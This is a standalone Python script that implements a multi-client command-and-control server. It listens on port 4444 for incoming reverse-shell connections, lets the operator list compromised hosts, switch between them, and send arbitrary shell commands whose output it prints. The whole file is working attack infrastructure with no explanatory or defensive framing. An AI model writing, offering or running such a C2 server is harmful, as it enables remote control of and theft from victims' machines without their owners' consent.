import socket
import threading

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

clients = {}
client_threads = {}

def handle_client(client_socket, addr):
    client_id = f"{addr[0]}:{addr[1]}"
    clients[client_id] = client_socket
    print(f"Connection from {addr}")

    while True:
        try:
            command = input(f"Shell ({client_id})> ")
            if command.lower() == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                del clients[client_id]
                print(f"Connection closed for {addr}")
                break
            elif command.lower() == "switch":
                break
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except ConnectionResetError:
            print(f"Connection lost from {addr}")
            del clients[client_id]
            break

def accept_connections(server_socket):
    while True:
        client_socket, addr = server_socket.accept()
        client_id = f"{addr[0]}:{addr[1]}"
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_threads[client_id] = client_thread
        client_thread.start()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((LISTEN_IP, LISTEN_PORT))
    server_socket.listen(5)
    print(f"Listening on {LISTEN_IP}:{LISTEN_PORT}")

    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
    accept_thread.start()

    while True:
        command = input("C2> ")
        if command.lower() == "list":
            for client_id in clients:
                print(client_id)
        elif command.lower().startswith("switch"):
            try:
                _, client_id = command.split()
                if client_id in clients:
                    handle_client(clients[client_id], client_id.split(":"))
                else:
                    print("Client ID not found")
            except ValueError:
                print("Usage: switch <client_id>")
        elif command.lower() == "exit":
            print("Shutting down C2 server.")
            for client_id, client_socket in clients.items():
                client_socket.send(b"exit")
                client_socket.close()
            break

if __name__ == "__main__":
    main()
